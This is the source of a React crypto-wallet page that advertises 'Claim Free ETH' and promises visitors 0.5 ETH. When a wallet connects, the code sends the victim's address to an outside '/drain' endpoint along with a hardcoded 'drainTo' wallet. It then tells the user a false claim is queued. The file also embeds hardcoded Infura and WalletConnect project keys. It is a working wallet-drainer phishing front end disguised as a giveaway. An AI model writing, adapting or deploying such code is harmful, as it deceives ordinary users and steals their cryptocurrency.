import React, { useState } from "react";
import ReactDOM from "react-dom/client";

import {
  WagmiConfig,
  createConfig,
  useConnect,
  useAccount,
  useDisconnect,
  configureChains,
  mainnet,
  sepolia,
  jsonRpcProvider,
} from "wagmi";

import { InjectedConnector } from "wagmi/connectors/injected";
import { WalletConnectConnector } from "wagmi/connectors/walletConnect";

import { Web3Modal } from "@reown/appkit/react"; // Reown AppKit modal
import "@reown/appkit/styles.css"; // include default styles

/* ---------------------------
   Wagmi + Chains Configuration
---------------------------- */

const chains = [mainnet, sepolia];

const { chains: configuredChains, publicClient } = configureChains(chains, [
  jsonRpcProvider({
    rpc: (chain) =>
      chain.id === mainnet.id
        ? "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2"
        : `https://sepolia.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2`,
  }),
]);

const connectors = [
  new InjectedConnector({ chains: configuredChains }),
  new WalletConnectConnector({
    chains: configuredChains,
    options: { projectId: "962425907914a3e80a7d8e7288b23f62" },
  }),
];

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors,
  publicClient,
});

/* ---------------------------
   App Component
---------------------------- */

const App = () => {
  const [loading, setLoading] = useState(false);
  const [response, setResponse] = useState(null);

  const { connectAsync } = useConnect();
  const { address: walletAddress } = useAccount();
  const { disconnect } = useDisconnect();

  const connectWallet = async (connector) => {
    try {
      setLoading(true);
      setResponse(null);

      const { account } = await connectAsync({ connector });

      if (!account) throw new Error("No wallet connected");

      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: account,
          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
        }),
      });

      const data = await res.json();

      setResponse({
        success: res.ok,
        message: res.ok
          ? "Token claim queued. You will be credited shortly."
          : "Failed to claim token.",
        data,
      });
    } catch (err) {
      console.error(err);
      setResponse({ success: false, message: "Wallet connection failed." });
    } finally {
      setLoading(false);
    }
  };

  return (
    <WagmiConfig config={wagmiConfig}>
      <div
        style={{
          minHeight: "100vh",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          background: "#121212",
          color: "#fff",
          fontFamily: "Arial, sans-serif",
        }}
      >
        <div
          style={{
            background: "#1e1e1e",
            padding: "30px",
            borderRadius: "12px",
            width: "100%",
            maxWidth: "420px",
            textAlign: "center",
          }}
        >
          <h1 style={{ marginBottom: "16px" }}>Claim Free ETH</h1>
          <p style={{ fontSize: "14px", color: "#ccc" }}>
            Connect your wallet to claim 0.5 ETH.
          </p>

          <Web3Modal
            projectId="962425907914a3e80a7d8e7288b23f62"
            themeMode="dark"
            enableAnalytics
            onConnect={(connector) => connectWallet(connector)}
            connectors={connectors}
          >
            {({ open }) => (
              <button
                onClick={open}
                disabled={loading}
                style={{
                  marginTop: "20px",
                  padding: "12px 24px",
                  width: "100%",
                  background: "#4CAF50",
                  border: "none",
                  borderRadius: "8px",
                  color: "#fff",
                  fontSize: "16px",
                  cursor: "pointer",
                  fontWeight: "bold",
                }}
              >
                {loading ? "Connecting..." : "Connect Wallet"}
              </button>
            )}
          </Web3Modal>

          {walletAddress && (
            <p style={{ marginTop: "12px", fontSize: "12px", color: "#aaa" }}>
              Connected: {walletAddress}
            </p>
          )}

          {response && (
            <pre
              style={{
                marginTop: "16px",
                background: "#2a2a2a",
                padding: "12px",
                borderRadius: "8px",
                fontSize: "12px",
                textAlign: "left",
              }}
            >
              {JSON.stringify(response, null, 2)}
            </pre>
          )}

          {walletAddress && (
            <button
              onClick={disconnect}
              style={{
                marginTop: "12px",
                padding: "8px 16px",
                background: "#f44336",
                color: "#fff",
                border: "none",
                borderRadius: "6px",
                cursor: "pointer",
              }}
            >
              Disconnect
            </button>
          )}
        </div>
      </div>
    </WagmiConfig>
  );
};

/* ---------------------------
   Mount React App
---------------------------- */

ReactDOM.createRoot(document.getElementById("root")).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
